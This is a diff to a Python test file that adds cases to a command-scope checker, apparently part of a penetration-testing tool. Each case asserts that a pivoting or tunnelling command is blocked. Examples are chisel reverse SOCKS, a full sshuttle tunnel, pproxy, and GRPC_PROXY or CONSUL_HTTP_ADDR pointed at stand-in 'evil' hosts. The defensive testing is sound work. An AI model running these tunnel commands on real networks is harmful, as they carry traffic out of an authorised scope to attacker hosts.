@@ -578,9 +578,46 @@ class TestAssertCommandInScope:
             assert_command_in_scope(
                 "sshuttle -r user@evilhost 0/0", scope_env=scope
             )
-        with pytest.raises(PermissionDeniedError, match="evilhost"):
+        # Out-of-scope hop with R:socks: SOCKS pivot blocked first (RH-29).
+        with pytest.raises(PermissionDeniedError, match="SOCKS|socks|evilhost"):
             assert_command_in_scope(
                 "chisel client evilhost:8080 R:socks", scope_env=scope
+            )
+        # RH-29: in-scope hop + trailing R:socks still pivots out of engagement.
+        with pytest.raises(PermissionDeniedError, match="SOCKS|socks"):
+            assert_command_in_scope(
+                "chisel client 10.0.0.1:8080 R:socks", scope_env=scope
+            )
+        with pytest.raises(PermissionDeniedError, match="SOCKS|socks"):
+            assert_command_in_scope(
+                "chisel client 10.0.0.1:8080 1080:socks", scope_env=scope
+            )
+        # RH-30: sshuttle full-tunnel via in-scope remote.
+        with pytest.raises(PermissionDeniedError, match="full-tunnel|0/0"):
+            assert_command_in_scope(
+                "sshuttle -r user@10.0.0.1 0/0", scope_env=scope
+            )
+        # RH-32 / RH-34: opaque proxy wrappers / docker context hide egress.
+        with pytest.raises(PermissionDeniedError, match="pproxy|Proxy/tunnel"):
+            assert_command_in_scope(
+                "pproxy -l http://:8080 -r socks5://1.1.1.1:1080", scope_env=scope
+            )
+        with pytest.raises(PermissionDeniedError, match="context use"):
+            assert_command_in_scope("docker context use prod", scope_env=scope)
+        # RH-33: service-discovery / DB transport env pivots.
+        with pytest.raises(PermissionDeniedError, match="CONSUL_HTTP_ADDR|Transport"):
+            assert_command_in_scope(
+                "CONSUL_HTTP_ADDR=http://evil:8500 curl http://10.0.0.1/",
+                scope_env=scope,
+            )
+        with pytest.raises(PermissionDeniedError, match="evilhost"):
+            assert_command_in_scope(
+                "clickhouse-client -h evilhost", scope_env=scope
+            )
+        with pytest.raises(PermissionDeniedError, match="GRPC_PROXY|Proxy environment"):
+            assert_command_in_scope(
+                "GRPC_PROXY=http://evil:8080 curl http://10.0.0.1/",
+                scope_env=scope,
             )
         with pytest.raises(PermissionDeniedError, match="evilhost"):
             assert_command_in_scope(
